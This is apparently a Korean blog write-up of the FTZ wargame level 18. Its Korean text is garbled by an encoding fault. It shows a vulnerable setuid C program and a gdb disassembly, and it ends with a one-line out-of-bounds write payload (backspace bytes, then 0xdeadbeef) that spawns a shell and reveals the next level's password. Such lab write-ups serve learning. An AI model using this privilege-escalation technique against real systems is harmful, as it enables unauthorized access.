I"Î<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level18 
level18@~~~~~<span class="s1">'s password: 
[level18@ftz level18]$ ls 
attackme  hint  public_html  tmp 
[level18@ftz level18]$ cat hint 

#include &lt;stdio.h&gt;
#include &lt;sys/time.h&gt; 
#include &lt;sys/types.h&gt; 
#include  &lt;unistd.h&gt;
void shellout(void); 
int main() 
{ 
  char string[100]; 
  int check; 
  int x = 0; 
  int count = 0; 
  fd_set fds; 
  printf("Enter your command: "); 
  fflush(stdout); 
  while(1) 
    { 
      if(count &gt;= 100) 
        printf("what are you trying to do?\n"); 
      if(check == 0xdeadbeef) 
        shellout(); 
      else 
        { 
          FD_ZERO(&amp;fds); 
          FD_SET(STDIN_FILENO,&amp;fds); 

          if(select(FD_SETSIZE, &amp;fds, NULL, NULL, NULL) &gt;= 1) 
            { 
              if(FD_ISSET(fileno(stdin),&amp;fds)) 
                { 
                  read(fileno(stdin),&amp;x,1); 
                  switch(x) 
                    { 
                      case '</span><span class="se">\r</span><span class="s1">': 
                      case '</span><span class="se">\n</span><span class="s1">': 
                        printf("\a"); 
                        break; 
                      case 0x08: 
                        count--; 
                        printf("\b \b"); 
                        break; 
                      default: 
                        string[count] = x; 
                        count++; 
                        break; 
                    } 
                } 
            } 
        } 
    } 
} 

void shellout(void) 
{ 
  setreuid(3099,3099); 
  execl("/bin/sh","sh",NULL); 
} 

[level18@ftz level18]$
</span></code></pre></div></div>

<p>ì½”ë“œê°€ ë§¤ìš° ê¸¸ë‹¤. ì†”ì§íˆ ë¬´ìŠ¨ í”„ë¡œê·¸ë¨ì¸ì§€ ì•Œì•„ë‚´ê¸° ìœ„í•´ì„œëŠ” êµ¬ê¸€ë§ì„ í•´ì•¼ í•  ê²ƒ ê°™ë‹¤.</p>

<p>ê·¸ëŸ¬ë‚˜ ì´ëŸ° ì½”ë“œë¥¼ ë³¼ ë•Œì—ëŠ” ì–´ë–»ê²Œ í•˜ë©´ í•´í‚¹ì„ ì„±ê³µí•  ìˆ˜ ìˆì„ì§€ í•µì‹¬ì ì¸ ë‚´ìš©ë§Œ íŒŒì•…í•  ìˆ˜ ìˆìœ¼ë©´ ëœë‹¤.</p>

<p>ìš°ì„  checkê°€ deadbeefê°€ ë˜ë©´ /bin/bashë¥¼ ì‹¤í–‰ì— í•´í‚¹ì— ì„±ê³µí•  ìˆ˜ ìˆë‹¤.</p>

<p>í•œê¸€ìì”© ì…ë ¥ì„ ë°›ìœ¼ë©° ê·¸ ê°’ì„ string[count]ì— ë„£ì–´ì£¼ëŠ” ì½”ë“œì´ë‹¤.</p>

<p>ë³¸ì¸ì€ ë¬¸ì œë¥¼ í’€ê¸° ìœ„í•´ ì–•ê²Œ ê³µë¶€í–ˆìœ¼ë¯€ë¡œ ìì„¸íˆ ì„¤ëª…í•´ ì¤„ ìˆ˜ ì—†ë‹¤.</p>

<p>ìì„¸íˆ ì•Œê³ ì‹¶ìœ¼ë©´ ì´ ì‚¬ì´íŠ¸ë¥¼ ë³´ëŠ” ê²ƒì´ ì¢‹ì„ ê²ƒì´ë‹¤.</p>

<p>https://grayfieldbox.tistory.com/entry/FTZFree-Training-Zone-Level-18</p>

<p>ì´ ë¬¸ì œëŠ” OOBì˜ ê¸°ë²•ì„ ì‚¬ìš©í•œë‹¤.</p>

<p>https://cw0rldwriteup.tistory.com/20</p>

<p>ë‚´ê°€ ì´ì „ì— ì •ë¦¬í•´ ë’€ë˜ OOBì˜ ì›ë¦¬ë‹¤.</p>

<p>ë²„í¼ì˜¤ë²„í”Œë¡œìš°ê°€ ìµìˆ™í•˜ë‹¤ë©´ ì–´ë µì§€ ì•Šì„ ê²ƒì´ë‹¤.</p>

<p>ë§Œì•½ ì´í•´ê°€ ë˜ì§€ ì•ŠëŠ”ë‹¤ë©´ êµ¬ê¸€ë§ì„ ì¶”ì²œí•œë‹¤.</p>

<p>ìš°ì„  gdbë¡œ ë¶„ì„í•´ë³´ì.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level18@ftz level18]<span class="nv">$ </span>gdb <span class="nt">-q</span> attackme 
<span class="o">(</span>no debugging symbols found<span class="o">)</span>...<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel 
<span class="o">(</span>gdb<span class="o">)</span> disas main 
Dump of assembler code <span class="k">for function </span>main: 
0x08048550 &lt;main+0&gt;:    push   ebp 
0x08048551 &lt;main+1&gt;:    mov    ebp,esp 
0x08048553 &lt;main+3&gt;:    sub    esp,0x100 
0x08048559 &lt;main+9&gt;:    push   edi 
0x0804855a &lt;main+10&gt;:   push   esi 
0x0804855b &lt;main+11&gt;:   push   ebx 
0x0804855c &lt;main+12&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-108],0x0 
0x08048563 &lt;main+19&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-112],0x0 
0x0804856a &lt;main+26&gt;:   push   0x8048800 
0x0804856f &lt;main+31&gt;:   call   0x8048470  &lt;<span class="nb">printf</span><span class="o">&gt;</span>
0x08048574 &lt;main+36&gt;:   add    esp,0x4 
0x08048577 &lt;main+39&gt;:   mov    eax,ds:0x804993c 
0x0804857c &lt;main+44&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-252],eax 
0x08048582 &lt;main+50&gt;:   mov    ecx,DWORD PTR <span class="o">[</span>ebp-252] 
0x08048588 &lt;main+56&gt;:   push   ecx 
0x08048589 &lt;main+57&gt;:   call   0x8048430  &lt;fflush&gt;
0x0804858e &lt;main+62&gt;:   add    esp,0x4 
0x08048591 &lt;main+65&gt;:   jmp    0x8048598 &lt;main+72&gt; 
0x08048593 &lt;main+67&gt;:   jmp    0x8048775 &lt;main+549&gt; 
0x08048598 &lt;main+72&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-112],0x63 
0x0804859c &lt;main+76&gt;:   jle    0x80485ab &lt;main+91&gt; 
0x0804859e &lt;main+78&gt;:   push   0x8048815 
0x080485a3 &lt;main+83&gt;:   call   0x8048470  
0x080485a8 &lt;main+88&gt;:   add    esp,0x4 
0x080485ab &lt;main+91&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-104],0xdeadbeef

........
</code></pre></div></div>

<p>main+91ì—ì„œ ë³€ìˆ˜ì™€ deadbeefë¥¼ ë¹„êµí•˜ëŠ” ê²ƒì´ ë³´ì¸ë‹¤.</p>

<p>ì €ê²ƒì´ checkì˜ ì£¼ì†Œê°’ì¼ ê²ƒì´ë‹¤.</p>

<p>checkì˜ ì£¼ì†Œê°’ : ebp-104</p>

<p>C ì½”ë“œì—ì„œ checkì™€ stringì€ ë°”ë¡œ ì˜†ì— ìœ„ì¹˜í•´ ìˆë‹¤.</p>

<p>C í”„ë¡œê·¸ë¨ìƒ 0x08ì„ ë„£ìœ¼ë©´ countê°€ 1ì”© ëŠ˜ì–´ë‚œë‹¤.</p>

<p>ê·¸ëŸ¬ë¯€ë¡œ ë¬´ì‘ìœ„ ëŒ€ì…ì„ í•´ ë³´ê¸°ë¡œ í–ˆë‹¤.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level18@ftz level18]<span class="nv">$ </span><span class="o">(</span>python-c<span class="s1">'print"\x08"*4+"\xef\xbe\xad\xde"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./attackme 
Enter your <span class="nb">command</span>: my-pass 

Level19 Password is <span class="s2">"swimming in pink"</span><span class="nb">.</span> 
</code></pre></div></div>

:ET